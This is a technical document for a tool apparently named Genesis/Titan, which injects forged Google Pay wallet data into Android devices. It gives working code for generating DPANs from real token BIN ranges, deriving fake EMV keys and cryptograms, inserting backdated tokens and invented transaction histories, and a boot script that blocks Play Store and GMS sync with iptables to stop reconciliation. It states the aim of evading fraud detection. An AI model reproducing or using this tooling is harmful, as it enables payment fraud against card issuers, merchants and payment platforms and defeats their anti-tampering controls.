# 01 — Google Pay Injection via Genesis

How Genesis injects credit card data into Google Pay's `tapandpay.db`, generates Device PANs (DPANs), creates EMV session keys, builds transaction history, and configures NFC tap-and-pay.

---

## Table of Contents

1. [Overview](#1-overview)
2. [Injection Flow](#2-injection-flow)
3. [DPAN Generation](#3-dpan-generation)
4. [tapandpay.db Schema & Injection](#4-tapandpaydb-schema--injection)
5. [EMV Session Key Generation](#5-emv-session-key-generation)
6. [Transaction History Injection](#6-transaction-history-injection)
7. [NFC Configuration](#7-nfc-configuration)
8. [Shared Preferences Updates](#8-shared-preferences-updates)
9. [DPAN Rotation (V12)](#9-dpan-rotation-v12)
10. [Transaction Correlation (V12)](#10-transaction-correlation-v12)
11. [Cloud Sync Mitigation](#11-cloud-sync-mitigation)
12. [Codebase Cross-References](#12-codebase-cross-references)

---

## 1. Overview

Google Pay stores tokenized card data in a SQLite database called `tapandpay.db`. Genesis creates this database from scratch (or modifies an existing one), populates it with token records, EMV session keys, and synthetic transaction history, then pushes it to the device via ADB with correct file ownership and SELinux context.

**Primary path:** `/data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db`
**Fallback path:** `/data/data/com.google.android.gms/databases/tapandpay.db`

**Source file:** `core/wallet_provisioner.py` — method `_provision_google_pay()` (lines 578–856)

---

## 2. Injection Flow

```
1. am force-stop com.google.android.apps.walletnfcrel    ← prevent DB locks
2. adb pull tapandpay.db (if exists) OR create new SQLite DB
3. Create tables: tokens, token_metadata, session_keys, emv_session_keys,
                  transaction_history, billing_prefs, enrollment_info
4. INSERT token record with DPAN, issuer, expiry, card art URLs
5. INSERT token_metadata with provisioning status = 'PROVISIONED'
6. INSERT EMV session keys (LUK + ARQC)
7. INSERT synthetic transaction history (5-15 entries)
8. adb push tapandpay.db → device temp path
9. mv to final wallet databases path
10. chown {wallet_uid}:{wallet_uid} + chmod 660 + restorecon
11. Write NFC shared preferences (nfc_on_prefs.xml, default_settings.xml)
12. Enable system NFC: settings put secure nfc_on 1
13. am start com.google.android.apps.walletnfcrel        ← restart wallet
```

**Source:** `core/wallet_provisioner.py` lines 578–856

---

## 3. DPAN Generation

A DPAN (Device Primary Account Number) is a tokenized surrogate for the real card number (FPAN). Google Pay never stores the real card number — it stores the DPAN, which the Token Service Provider (TSP) maps back to the FPAN during transactions.

### Requirements
- Must be **Luhn-valid** (passes standard checksum)
- Must have a **network-appropriate prefix**
- Must be **different from the real PAN**
- **16 digits** (Visa/MC/Discover) or **15 digits** (Amex)

### Algorithm

Genesis uses **real TSP-assigned Token BIN ranges** — not generic network prefixes. These BIN ranges are reserved by Visa/Mastercard specifically for Device PANs (cloud tokens), making the DPAN structurally indistinguishable from a legitimately provisioned token.

```python
def generate_dpan(card_number: str) -> str:
    """Generate a DPAN using TSP (Token Service Provider) BIN ranges."""
    network = detect_network(card_number)["network"]

    # TSP-assigned Token BIN ranges (reserved for DPANs, NOT issuer BINs)
    TOKEN_BIN_RANGES = {
        "visa":       ["489537", "489538", "489539", "440066", "440067"],
        "mastercard": ["530060", "530061", "530062", "530063", "530064", "530065"],
        "amex":       ["374800", "374801"],
        "discover":   ["601156", "601157"],
    }

    token_bin = random.choice(TOKEN_BIN_RANGES.get(network, TOKEN_BIN_RANGES["visa"]))

    # Generate random body digits (total length - 6 BIN digits - 1 check digit)
    remaining_len = len(card_number) - 7
    body = "".join([str(random.randint(0, 9)) for _ in range(remaining_len)])
    partial = token_bin + body

    # Luhn check digit calculation
    digits = [int(d) for d in partial]
    total = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 0:
            doubled = d * 2
            total += doubled - 9 if doubled > 9 else doubled
        else:
            total += d
    check = (10 - (total % 10)) % 10
    return partial + str(check)
```

**Why TSP BIN ranges matter:** Real network tokenization assigns DPANs from dedicated BIN ranges (e.g., 489537 for Visa cloud tokens). Using generic prefixes like "4xxxx" would be detectable as non-standard. TSP BIN ranges make the DPAN look like it came from a legitimate Google Pay tokenization flow.

**Source:** `core/wallet_provisioner.py` lines 187–226 (`generate_dpan()`)

### Network Detection

Card network is detected from the card number prefix:

| Prefix Pattern | Network |
|---------------|---------|
| `4xxxxxx` | Visa |
| `51-55xxxx`, `2221-2720` | Mastercard |
| `34xxxx`, `37xxxx` | American Express |
| `6011xx`, `644-649xx`, `65xxxx` | Discover |
| `3528-3589` | JCB |
| `300-305`, `36xx`, `38xx` | Diners Club |

**Source:** `core/wallet_provisioner.py` lines 67–85 (`CARD_NETWORKS`) and `core/bin_database.py` lines 124–133 (`NETWORK_PREFIXES`)

### Issuer Detection

The first 6 digits (BIN) identify the issuing bank:

```python
ISSUER_MAP = {
    "453201": "Chase", "453265": "Chase",
    "402400": "Capital One", "427533": "Capital One",
    "400011": "Bank of America", "421783": "Bank of America",
    "446291": "Citibank", "453275": "Citibank",
    "476173": "Wells Fargo", "485246": "Wells Fargo",
    # ... 60+ BIN entries
}
```

**Source:** `core/wallet_provisioner.py` lines 85–100 (`ISSUER_MAP`) and `core/bin_database.py` (full BIN database with 60+ records covering US/UK/EU banks, prepaid, and corporate cards)

---

## 4. tapandpay.db Schema & Injection

### tokens Table (24 columns)

```sql
CREATE TABLE tokens (
    id                              INTEGER PRIMARY KEY AUTOINCREMENT,
    dpan                            TEXT NOT NULL,        -- Tokenized PAN (generated)
    fpan_last4                      TEXT NOT NULL,        -- Real card last 4 digits
    card_network                    INTEGER NOT NULL,     -- 3=Visa, 4=MC, 5=Amex, 6=Discover
    card_description                TEXT,                 -- "Visa •••• 4242"
    issuer_name                     TEXT,                 -- "Chase", "Bank of America"
    issuer_id                       TEXT DEFAULT '',
    funding_source_id               TEXT DEFAULT '',      -- UUID4 (links to COIN.xml)
    card_art_url                    TEXT DEFAULT '',      -- Google CDN art URL
    card_art_fife_url               TEXT DEFAULT '',      -- FIFE art URL
    token_reference_id              TEXT DEFAULT '',      -- "DNITHE{12hex}"
    last_four_of_fpan               TEXT DEFAULT '',
    dpan_last_four                  TEXT DEFAULT '',
    terms_and_conditions_accepted   INTEGER DEFAULT 1,
    expiry_month                    INTEGER,
    expiry_year                     INTEGER,
    card_color                      INTEGER DEFAULT -1,
    is_default                      INTEGER DEFAULT 0,    -- 1 = default card
    status                          INTEGER DEFAULT 1,    -- 1 = active
    token_service_provider          INTEGER DEFAULT 1,    -- 1 = Google
    token_type                      TEXT DEFAULT 'CLOUD', -- CLOUD | DEVICE
    wallet_account_id               TEXT DEFAULT '',      -- UUID4
    device_type                     TEXT DEFAULT 'PHONE',
    created_timestamp               INTEGER,              -- Unix ms (backdated)
    last_used_timestamp             INTEGER               -- Unix ms (recent)
);
```

### Card Network IDs

| ID | Network | Color Constant |
|:--:|---------|:--------------:|
| 1 | Visa | -16776961 |
| 2 | Mastercard | -65536 |
| 3 | American Express | -16711936 |
| 4 | Discover | -19712 |

### token_metadata Table

```sql
CREATE TABLE token_metadata (
    token_id                INTEGER PRIMARY KEY,
    token_state             TEXT DEFAULT 'ACTIVE',
    token_pan               TEXT,              -- Same as DPAN
    token_expiry            TEXT,              -- "MM/YYYY"
    token_requestor_id      TEXT DEFAULT 'GOOGLE_PAY',
    provisioning_status     TEXT DEFAULT 'PROVISIONED',
    token_type              TEXT DEFAULT 'CLOUD',
    last_updated_timestamp  INTEGER,
    FOREIGN KEY (token_id) REFERENCES tokens(id)
);
```

### Timestamp Backdating

Timestamps are deliberately backdated to make the token appear aged:

- `created_timestamp`: `now - random(7..30 days)` in milliseconds
- `last_used_timestamp`: `now - random(0..7 days)` in milliseconds
- `last_updated_timestamp`: between created and last_used

This prevents the token from appearing freshly injected.

**Source:** `core/wallet_provisioner.py` lines 600–720

---

## 5. EMV Session Key Generation

Genesis generates simplified EMV session keys to populate the `session_keys` and `emv_session_keys` tables. These simulate the Limited Use Keys (LUK) and Authorization Request Cryptograms (ARQC) that real tokenized cards use for contactless payments.

### LUK Derivation (3-stage HMAC-SHA256 chain)

Genesis implements a simplified EMV CDA key derivation using HMAC-SHA256 truncated to 16 bytes (matching 3DES double-length key size). This is NOT actual 3DES — it's sufficient for DB population but not for live terminal cryptographic verification.

```python
def _derive_luk(dpan: str, atc: int, mdk_seed=None) -> bytes:
    """Derive LUK via MDK → UDK → LUK chain."""
    # 1. MDK (Master Derivation Key): deterministic from DPAN
    mdk_seed = hashlib.sha256(f"TITAN-MDK-{dpan}".encode()).digest()[:16]

    # 2. UDK (Unique Derivation Key): HMAC-SHA256(MDK, PAN_block)[:16]
    pan_block = dpan[-13:-1].encode()  # 12 digits, right-aligned
    udk = hmac.new(mdk_seed, pan_block, hashlib.sha256).digest()[:16]

    # 3. LUK: HMAC-SHA256(UDK, ATC_block)[:16]
    atc_block = struct.pack(">I", atc)  # 4-byte big-endian
    luk = hmac.new(udk, atc_block, hashlib.sha256).digest()[:16]
    return luk  # 16 bytes = double-length 3DES key
```

### ARQC Generation

```python
def _generate_arqc(luk: bytes, amount: int, atc: int, unpredictable_number=None) -> str:
    """Generate Authorization Request Cryptogram (8 bytes = 16 hex chars)."""
    if unpredictable_number is None:
        unpredictable_number = secrets.token_bytes(4)
    # Transaction data: amount(4B) + ATC(2B) + UN(4B)
    txn_data = struct.pack(">IH", amount, atc & 0xFFFF) + unpredictable_number
    mac = hmac.new(luk, txn_data, hashlib.sha256).digest()[:8]
    return mac.hex().upper()
```

### Full EMV Session

```python
def generate_emv_session(dpan: str, atc_counter: int = 0,
                         num_transactions: int = 0) -> Dict:
    luk = _derive_luk(dpan, atc_counter)
    cryptograms = []
    for i in range(num_transactions):
        arqc = _generate_arqc(luk, random.randint(100, 50000), atc_counter + i)
        cryptograms.append({"atc": atc_counter + i, "arqc": arqc})
    return {
        "luk_hex": luk.hex().upper(),
        "atc": atc_counter + num_transactions,
        "cryptograms": cryptograms,
        "key_expiry_ms": int(time.time() * 1000) + 86400000,  # 24h
        "max_transactions": random.randint(5, 10),
    }
```

### emv_metadata Table

```sql
CREATE TABLE emv_metadata (
    token_id          INTEGER PRIMARY KEY,
    cvn               TEXT DEFAULT '17',              -- Cryptogram Version Number (CVN17 = standard cloud)
    cvr               TEXT DEFAULT '0000000000000000', -- Card Verification Results
    iad               TEXT DEFAULT '',                -- Issuer Application Data (contains LUK prefix)
    cryptogram_version TEXT DEFAULT 'EMV_2000',       -- EMV spec version
    cryptogram_type   TEXT DEFAULT 'ARQC',            -- Authorization Request Cryptogram
    FOREIGN KEY (token_id) REFERENCES tokens(id)
);
```

**Note:** CVN17 is the standard algorithm for cloud tokens. The IAD field is populated with `0A{luk_hex[:8]}` to embed a reference to the LUK derivation key index.

### session_keys Table

```sql
CREATE TABLE session_keys (
    id                INTEGER PRIMARY KEY AUTOINCREMENT,
    token_id          INTEGER NOT NULL,
    key_type          TEXT DEFAULT 'LUK',
    key_data          TEXT DEFAULT '',     -- HMAC-SHA256 derived LUK hex (16 bytes)
    key_expiry        INTEGER,             -- Unix ms (24h from creation)
    atc_counter       INTEGER DEFAULT 0,   -- Application Transaction Counter
    max_transactions  INTEGER DEFAULT 10,  -- LUK expires after 5-10 txns
    created_timestamp INTEGER,
    FOREIGN KEY (token_id) REFERENCES tokens(id)
);
```

**Source:** `core/wallet_provisioner.py` lines 236–307

---

## 6. Transaction History Injection

Genesis injects synthetic transaction records into the `transaction_history` table of `tapandpay.db` to make the wallet appear actively used.

### transaction_history Table

```sql
CREATE TABLE transaction_history (
    id                      INTEGER PRIMARY KEY AUTOINCREMENT,
    token_id                INTEGER,
    merchant_name           TEXT,
    merchant_category_code  INTEGER,      -- MCC code
    amount_micros           INTEGER,      -- Amount × 10,000
    currency_code           TEXT,         -- "USD"
    transaction_type        TEXT,         -- "CONTACTLESS"
    transaction_status      TEXT,         -- "COMPLETED"
    timestamp_ms            INTEGER,      -- Unix ms (backdated)
    FOREIGN KEY (token_id) REFERENCES tokens(id)
);
```

### Merchant MCC Codes Used

| Merchant | MCC | Amount Range ($) |
|----------|:---:|:----------------:|
| Starbucks | 5814 | 3.00–8.00 |
| Target | 5331 | 15.00–80.00 |
| Walmart | 5411 | 20.00–150.00 |
| Amazon | 5942 | 10.00–250.00 |
| McDonald's | 5814 | 5.00–15.00 |
| Costco | 5411 | 50.00–300.00 |
| Chipotle | 5812 | 8.00–18.00 |
| CVS Pharmacy | 5912 | 5.00–50.00 |

Transactions are backdated over the profile age period with randomized timestamps, and 5–15 entries are generated per card.

**Source:** `core/wallet_provisioner.py` lines 1510–1584 (`correlate_transactions_with_profile()`)

---

## 7. NFC Configuration

Two shared preference files are written to configure NFC tap-and-pay:

### nfc_on_prefs.xml

**Path:** `/data/data/com.google.android.apps.walletnfcrel/shared_prefs/nfc_on_prefs.xml`

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="nfc_enabled" value="true" />
    <boolean name="tap_and_pay_enabled" value="true" />
    <string name="default_payment_app">com.google.android.apps.walletnfcrel</string>
    <boolean name="payment_default_changed" value="false" />
</map>
```

### default_settings.xml

**Path:** `/data/data/com.google.android.apps.walletnfcrel/shared_prefs/default_settings.xml`

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="nfc_payment_default_set" value="true" />
    <string name="nfc_payment_component">
        com.google.android.apps.walletnfcrel/.tap.HceDelegateService
    </string>
    <long name="nfc_setup_timestamp" value="{now_ms}" />
</map>
```

### System-Level NFC Settings

```bash
settings put secure nfc_on 1
settings put secure nfc_payment_foreground 1
setprop persist.titan.nfc.enabled 1
```

**Source:** `core/wallet_provisioner.py` lines 780–856

---

## 8. Shared Preferences Updates

After database injection, additional Google Pay shared preferences are written:

- **wallet_setup_prefs.xml** — marks wallet as initialized
- **nfc_on_prefs.xml** — enables NFC tap-and-pay
- **default_settings.xml** — sets Google Wallet as default NFC payment app

All shared prefs are written using the `_push_shared_prefs_xml()` helper which:
1. Builds Android-compatible XML
2. Writes to temp file
3. Pushes via ADB
4. Fixes ownership with `chown {uid}:{uid}`
5. Restores SELinux context with `restorecon -R`

**Source:** `core/wallet_provisioner.py` lines 1410–1460 (`_build_shared_prefs_xml()`, `_push_shared_prefs_xml()`, `_fix_ownership()`)

---

## 9. DPAN Rotation (V12)

V12 added DPAN rotation to simulate token lifecycle refresh. Real TSP backends rotate DPANs weekly or after suspicious activity.

```python
def rotate_dpan(self, card_number, exp_month, exp_year) -> Optional[str]:
    """Rotate DPAN: generate new DPAN, update tapandpay.db tokens
    and token_metadata, insert new session keys."""
```

### Process
1. Generate a new DPAN for the same card
2. Generate new EMV session keys for the rotated DPAN
3. `UPDATE tokens SET dpan='{new_dpan}', dpan_last_four='{new_last4}'`
4. `UPDATE token_metadata SET token_pan='{new_dpan}'`
5. `INSERT INTO session_keys` with new LUK for the rotated DPAN

**Source:** `core/wallet_provisioner.py` lines 1461–1508 (`rotate_dpan()`)

---

## 10. Transaction Correlation (V12)

V12 added transaction correlation with profile data. Instead of random timestamps, transactions align with:

- **Chrome visits** to merchant domains (same day)
- **Maps navigations** to retail POIs (±30 min after arrival)
- **Email receipts** (matching amount/merchant)

```python
def correlate_transactions_with_profile(self, profile: Dict) -> List[Dict]:
    """Generate transaction history correlated with Chrome + Maps + email."""
```

This produces transaction entries that cross-validate with other injected profile data, increasing trust coherence.

**Source:** `core/wallet_provisioner.py` lines 1510–1584 (`correlate_transactions_with_profile()`)

---

## 11. Cloud Sync Mitigation

After wallet injection, Google Play Store can detect tampering and reconcile:
1. Delete injected `tapandpay.db`
2. Overwrite `COIN.xml`
3. Clear GMS billing prefs

### V12 Boot Script Persistence (`99-titan-patch.sh`)

```bash
# Block Play Store network access (prevents reconciliation)
vuid=$(stat -c %u /data/data/com.android.vending 2>/dev/null)
iptables -I OUTPUT -m owner --uid-owner $vuid -j DROP

# Block GMS wallet sync to payments.google.com
muid=$(stat -c %u /data/data/com.google.android.gms 2>/dev/null)
iptables -I OUTPUT -p tcp --dport 443 -m owner --uid-owner $muid \
  -m string --string "payments.google.com" --algo bm -j DROP

# Clear wallet cache
rm -rf /data/data/com.google.android.gms/cache/tapandpay*

# Re-apply NFC prefs if missing
```

Additionally, `_provision_play_store()` applies multi-layer isolation at injection time:
- `am force-stop com.android.vending` — stops Play Store
- `pm disable com.android.vending/com.google.android.finsky.billing.BillingIntentService` — disables billing sync service
- iptables rules to block Play Store outbound traffic

**Source:** `core/wallet_provisioner.py` lines 859–957, `cuttlefish/init.d/99-titan-patch.sh`, `docs/05-wallet-injection.md` §2

---

## 12. Codebase Cross-References

| File | Relevant Section | Description |
|------|-----------------|-------------|
| `core/wallet_provisioner.py` lines 578–856 | `_provision_google_pay()` | Main Google Pay injection method |
| `core/wallet_provisioner.py` lines 187–226 | `generate_dpan()` | DPAN generation |
| `core/wallet_provisioner.py` lines 236–307 | `generate_emv_session()` | EMV session key generation |
| `core/wallet_provisioner.py` lines 1461–1508 | `rotate_dpan()` | V12 DPAN rotation |
| `core/wallet_provisioner.py` lines 1510–1584 | `correlate_transactions_with_profile()` | V12 transaction correlation |
| `core/wallet_provisioner.py` lines 1410–1460 | `_push_shared_prefs_xml()` | SharedPrefs XML helper |
| `core/wallet_verifier.py` lines 144–198 | `_check_tapandpay_*` | tapandpay.db verification checks |
| `core/bin_database.py` lines 55–122 | `STATIC_BIN_DATA` | BIN lookup for issuer detection |
| `server/routers/genesis.py` lines 402–470 | `genesis_wallet_transactions()` | API endpoint to read back wallet tx |
| `server/routers/provision.py` lines 710–759 | Pipeline Phase 6 | Pipeline wallet provision step |
| `cuttlefish/init.d/99-titan-patch.sh` | Boot script | Cloud sync mitigation persistence |
| `docs/05-wallet-injection.md` | Full doc | Existing wallet injection documentation |

---

*See [02-play-store-billing.md](02-play-store-billing.md) for Play Store billing and zero-auth bypass.*
